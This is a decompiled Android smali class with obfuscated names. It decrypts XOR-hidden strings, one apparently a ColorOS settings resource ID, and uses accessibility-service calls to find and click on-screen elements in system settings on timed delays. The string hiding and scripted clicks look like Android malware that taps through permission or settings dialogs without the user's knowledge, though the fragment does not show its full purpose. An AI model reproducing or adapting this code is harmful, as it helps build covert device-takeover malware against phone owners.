.class Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j$a$a$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j$a$a;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j$a$a;


# direct methods
.method constructor <init>(Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j$a$a;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j$a$a$a;->a:Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j$a$a;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()V
    .locals 5

    .line 1
    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a0(I)V

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v2, 0x30

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_0

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v0

    add-int/lit8 v0, v0, -0x1

    invoke-interface {v1, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-lez v1, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    add-int/lit8 v1, v1, -0x1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j$a$a$a$a;

    invoke-direct {v1, p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j$a$a$a$a;-><init>(Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j$a$a$a;)V

    goto :goto_0

    :cond_0
    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a0(I)V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x38

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v3, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_1

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    add-int/lit8 v1, v1, -0x1

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x10

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const/16 v0, 0xc8

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a0(I)V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x35

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v2, v3, [B

    fill-array-data v2, :array_5

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    const/4 v2, 0x2

    if-le v1, v2, :cond_1

    const/4 v1, 0x3

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j$a$a$a$b;

    invoke-direct {v1, p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j$a$a$a$b;-><init>(Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j$a$a$a;)V

    :goto_0
    invoke-static {v0, v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->v0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    :cond_1
    return-void

    nop

    :array_0
    .array-data 1
        -0x70t
        0x15t
        -0x38t
        -0x55t
        0x65t
        -0x57t
        -0x36t
        -0x3at
        -0x7ft
        0x15t
        -0x2at
        -0x55t
        0x76t
        -0x52t
        -0x37t
        -0x39t
        -0x6at
        0x17t
        -0x3ct
        -0x15t
        0x67t
        -0x5ft
        -0x3dt
        -0x25t
        -0x37t
        0x13t
        -0x3ft
        -0x56t
        0x65t
        -0x57t
        -0x2dt
        -0x40t
        -0x54t
        0xat
        -0x36t
        -0xbt
        0x73t
        -0x4at
        -0x7t
        -0x3bt
        -0x66t
        0x9t
        -0x2ft
        -0x26t
        0x70t
        -0x51t
        -0x3dt
        -0x22t
    .end array-data

    :array_1
    .array-data 1
        -0xdt
        0x7at
        -0x5bt
        -0x7bt
        0x6t
        -0x3at
        -0x5at
        -0x57t
    .end array-data

    :array_2
    .array-data 1
        0x72t
        0x61t
        -0x7ft
        0x53t
        0x62t
        0x38t
        -0x23t
        0x43t
        0x63t
        0x61t
        -0x61t
        0x53t
        0x71t
        0x3ft
        -0x22t
        0x42t
        0x74t
        0x63t
        -0x73t
        0x13t
        0x60t
        0x30t
        -0x2ct
        0x5et
        0x2bt
        0x67t
        -0x78t
        0x52t
        0x71t
        0x38t
        -0x3ft
        0x59t
        0x61t
        0x51t
        -0x80t
        0x14t
        0x72t
        0x23t
        -0x12t
        0x5bt
        0x78t
        0x60t
        -0x78t
        0x12t
        0x76t
        0x8t
        -0x28t
        0x58t
        0x74t
        0x63t
        -0x4dt
        0x9t
        0x68t
        0x23t
        -0x23t
        0x49t
    .end array-data

    :array_3
    .array-data 1
        0x11t
        0xet
        -0x14t
        0x7dt
        0x1t
        0x57t
        -0x4ft
        0x2ct
    .end array-data

    :array_4
    .array-data 1
        0x4t
        -0x2et
        0x23t
        -0x7t
        -0x31t
        -0x51t
        -0x60t
        0x23t
        0x15t
        -0x2et
        0x3dt
        -0x7t
        -0x24t
        -0x58t
        -0x5dt
        0x22t
        0x2t
        -0x30t
        0x2ft
        -0x47t
        -0x33t
        -0x59t
        -0x57t
        0x3et
        0x5dt
        -0x2ct
        0x2at
        -0x8t
        -0x31t
        -0x4bt
        -0x41t
        0x38t
        0x8t
        -0x30t
        0x2t
        -0x42t
        -0x3et
        -0x5bt
        -0x53t
        0x3et
        0x2bt
        -0x24t
        0x37t
        -0x48t
        -0x27t
        -0x4ct
        -0x76t
        0x23t
        0x15t
        -0xft
        0x27t
        -0x5ct
        -0x28t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x67t
        -0x43t
        0x4et
        -0x29t
        -0x54t
        -0x40t
        -0x34t
        0x4ct
    .end array-data
.end method
